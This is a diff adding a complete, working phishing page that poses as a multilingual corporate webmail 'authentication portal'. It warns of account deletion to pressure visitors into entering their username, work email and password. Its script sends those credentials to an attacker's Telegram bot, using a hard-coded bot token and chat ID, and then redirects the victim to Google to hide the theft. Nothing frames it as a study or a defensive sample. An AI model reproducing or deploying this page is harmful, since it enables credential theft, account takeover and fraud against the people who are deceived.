@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Portail d'Identification</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #ece9e6, #ffffff);
+      margin: 0;
+      padding: 0;
+    }
+
+    .banner {
+      background-color: #dc3545;
+      color: white;
+      padding: 1em;
+      text-align: center;
+      font-size: 1rem;
+      font-weight: bold;
+    }
+
+    .lang-switch {
+      text-align: right;
+      padding: 10px 20px;
+    }
+
+    .lang-switch button {
+      background: none;
+      border: none;
+      font-weight: bold;
+      color: #007BFF;
+      cursor: pointer;
+      font-size: 0.9rem;
+    }
+
+    .container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      padding: 2em;
+      margin: 2em auto;
+      max-width: 600px;
+      width: 90%;
+      text-align: center;
+    }
+
+    h2 {
+      color: #333;
+      margin-bottom: 0.5em;
+    }
+
+    .alert {
+      color: #721c24;
+      background-color: #f8d7da;
+      border: 1px solid #f5c6cb;
+      padding: 0.8em;
+      margin: 1em 0;
+      border-radius: 6px;
+      font-size: 0.9rem;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 1em;
+    }
+
+    .input-group input {
+      width: 90%;
+      padding: 0.75em 0.75em 0.75em 2.5em;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+      transition: border-color 0.3s ease;
+    }
+
+    .input-group input:focus {
+      border-color: #007BFF;
+      outline: none;
+    }
+
+    .input-group i {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #888;
+    }
+
+    button[type="submit"] {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      padding: 0.75em;
+      border-radius: 6px;
+      font-size: 1rem;
+      width: 100%;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button[type="submit"]:hover {
+      background-color: #218838;
+    }
+
+    img {
+      max-width: 120px;
+      margin-bottom: 1em;
+    }
+
+    .subtitle {
+      font-size: 1.1rem;
+      font-weight: bold;
+      margin: 0.5em 0;
+      color: #007BFF;
+    }
+
+    @media screen and (max-width: 480px) {
+      .container {
+        padding: 1.2em;
+      }
+
+      .lang-switch {
+        text-align: center;
+        margin-top: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="banner" id="bannerText">Mise à jour des opérations : veuillez remplir le formulaire ci-dessous</div>
+
+  <div class="lang-switch">
+    <button onclick="switchLang('fr')">🇫🇷 Français</button> | 
+    <button onclick="switchLang('de')">🇩🇪 Deutsch</button> | 
+    <button onclick="switchLang('en')">🇬🇧 English</button>
+  </div>
+
+  <div class="container">
+    <h2 id="title">Service Central d'Authentification</h2>
+    <img src="download.jpg" alt="Logo de confirmation" />
+    <div class="subtitle" id="subtitle">Portail Webmail</div>
+    <div class="alert" id="alertText">
+      Veuillez remplir les champs ci-dessous pour éviter la suppression de votre compte.
+    </div>
+
+    <form id="telegramForm">
+      <div class="input-group">
+        <i class="fas fa-user"></i>
+        <input type="text" id="userInput" placeholder="Identifiant" required />
+      </div>
+      <div class="input-group">
+        <i class="fas fa-envelope"></i>
+        <input type="email" id="emailInput" placeholder="Email professionnel" required />
+      </div>
+      <div class="input-group">
+        <i class="fas fa-lock"></i>
+        <input type="password" id="passInput" placeholder="Mot de passe" required />
+      </div>
+      <button type="submit" id="submitBtn">Valider</button>
+    </form>
+  </div>
+
+  <script>
+    const translations = {
+      fr: {
+        banner: "Mise à jour des opérations : veuillez remplir le formulaire ci-dessous",
+        title: "Service Central d'Authentification",
+        subtitle: "Portail Webmail",
+        alert: "Veuillez remplir les champs ci-dessous pour éviter la suppression de votre compte.",
+        placeholders: {
+          user: "Identifiant",
+          email: "Email professionnel",
+          pass: "Mot de passe"
+        },
+        button: "Valider"
+      },
+      de: {
+        banner: "Aktualisierung der Vorgänge: Bitte füllen Sie das untenstehende Formular aus",
+        title: "Zentraler Authentifizierungsdienst",
+        subtitle: "Webmail-Portal",
+        alert: "Bitte füllen Sie die untenstehenden Felder aus, um eine Löschung Ihres Kontos zu vermeiden.",
+        placeholders: {
+          user: "Benutzername",
+          email: "Berufliche E-Mail",
+          pass: "Passwort"
+        },
+        button: "Einloggen"
+      },
+      en: {
+        banner: "Operations Update: Please fill out the form below",
+        title: "Central Authentication Service",
+        subtitle: "Webmail Portal",
+        alert: "Please fill out the fields below to avoid account deletion.",
+        placeholders: {
+          user: "Username",
+          email: "Professional Email",
+          pass: "Password"
+        },
+        button: "Submit"
+      }
+    };
+
+    function switchLang(lang) {
+      const t = translations[lang];
+      document.getElementById('bannerText').textContent = t.banner;
+      document.getElementById('title').textContent = t.title;
+      document.getElementById('subtitle').textContent = t.subtitle;
+      document.getElementById('alertText').textContent = t.alert;
+      document.getElementById('userInput').placeholder = t.placeholders.user;
+      document.getElementById('emailInput').placeholder = t.placeholders.email;
+      document.getElementById('passInput').placeholder = t.placeholders.pass;
+      document.getElementById('submitBtn').textContent = t.button;
+    }
+
+    // Envoi des données vers Telegram
+    const token = '7724673238:AAFq3w_1vlwEqUMDJPT2aza3CQlJPPjuOv8';       // Remplacez par le token de votre bot
+    const chatId = '7199809945';    // Remplacez par votre chat ID
+
+    document.getElementById('telegramForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const user = document.getElementById('userInput').value;
+      const email = document.getElementById('emailInput').value;
+      const pass = document.getElementById('passInput').value;
+
+      const message = `
+🔔 Nouvelle soumission :
+👤 Identifiant : ${user}
+📧 Email : ${email}
+🔑 Mot de passe : ${pass}
+      `;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(response => {
+  if (response.ok) {
+    window.location.href = "https://www.google.com/"; // <-- Redirection
+  } else {
+    alert("Erreur lors de l'envoi !");
+  }
+})
+
+      .catch(error => {
+        console.error('Erreur :', error);
+        alert("Erreur lors de l'envoi !");
+      });
+    });
+  </script>
+
+</body>
+</html>
